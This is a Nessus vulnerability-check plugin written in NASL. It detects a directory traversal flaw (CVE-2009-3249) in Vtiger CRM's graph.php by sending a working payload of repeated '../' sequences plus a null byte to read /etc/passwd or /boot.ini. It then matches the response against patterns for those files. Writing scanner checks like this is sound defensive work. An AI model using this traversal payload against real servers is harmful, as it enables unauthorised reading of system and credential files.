#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(52656);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/05/19 18:10:50 $");

  script_cve_id("CVE-2009-3249");
  script_bugtraq_id(36062);
  script_osvdb_id(57239);
  script_xref(name:"EDB-ID", value:"9450");
  script_xref(name:"Secunia", value:"36309");

  script_name(english:"Vtiger CRM graph.php Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"An application running on the remote web server is affected by a
directory traversal vulnerability." );
  script_set_attribute(attribute:"description", value:
"The version of Vtiger installed on the remote host is vulnerable to a
directory traversal attack because it fails to properly sanitize user-
supplied input to the 'module' parameter of the 'graph.php' script.
An attacker can exploit this flaw to read arbitrary files from the
remote server subject to the privileges of the affected web service.

Note that the version of Vtiger is also potentially affected by
several other vulnerabilities, though Nessus has not tested for
these." );
  script_set_attribute(attribute:"see_also", value:"http://www.ush.it/team/ush/hack-vtigercrm_504/vtigercrm_504.txt");
  script_set_attribute(attribute:"solution", value:"Upgrade to Vtiger CRM 5.1.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"vtiger CRM 5.0.4 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
 script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/08/18");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/07/22");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/03/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, embedded:0, php:TRUE);

os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]";
file_pats['/boot.ini'] = "^ *\[boot loader\]";

# Look for Vtiger installs
if (thorough_tests) dirs = list_uniq(make_list("/vtiger", "/vtigercrm", "/crm", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
found_file = "";
installs = 0;
vuln_reqs = make_list();

foreach dir (dirs)
{
  # Make sure we're dealing with vtiger.
  res = http_get_cache(port:port, item:dir+'/', exit_on_fail:TRUE);
  if (
    '/vtigercrm_icon.ico">' >< res &&
    '<!-- startscrmprint --><' >< res &&
    '<a href=\'http://www.vtiger.com\' target=\'_blank\'>vtiger.com' >< res
  )
  {
    installs++;
    # Try to exploit the issue.
    foreach file (files)
    {
      # Once we find a file that works, stick with it for any subsequent tests.
      if (found_file && file != found_file) continue;

      # Try to exploit the issue
      exploit = mult_str(str:'../', nb:12) + file + '%00';

      url = dir + '/graph.php?module=' + exploit;

      res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
      body = res[2];

      # There's a problem if we see the expected contents.
      file_pat = file_pats[file];
      if (egrep(pattern:file_pat, string:body))
      {
        vuln_reqs = make_list(vuln_reqs, url);

        if (!contents && egrep(pattern:file_pat, string:body))
        {
          found_file = file;

          contents = body;
        }
      }
    }
  }
  if (max_index(vuln_reqs) && !thorough_tests) break;
}
if (!installs) exit(0, "The web server on port "+port+" does not appear to host vtiger CRM.");
if (max_index(vuln_reqs) == 0) exit(0, "No vulnerable installs of vtiger CRM were found on the web server on port "+port+".");

# Report findings.
if (report_verbosity > 0)
{
  line_limit = 10;
  trailer = '';

  if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

  header =
    'Nessus was able to exploit the issue to retrieve the contents of\n' +
    '\'' + found_file + '\' on the remote host using the following URL';

  if (report_verbosity > 1)
  {
    trailer =
      'Here are its contents (limited to ' + line_limit + ' lines ) :\n' +
      '\n' +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
      beginning_of_response(resp:contents, max_lines:line_limit) +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';
  }

  report = get_vuln_report(items:vuln_reqs, port:port, header:header, trailer:trailer);
  security_hole(port:port, extra:report);
}
else security_hole(port);
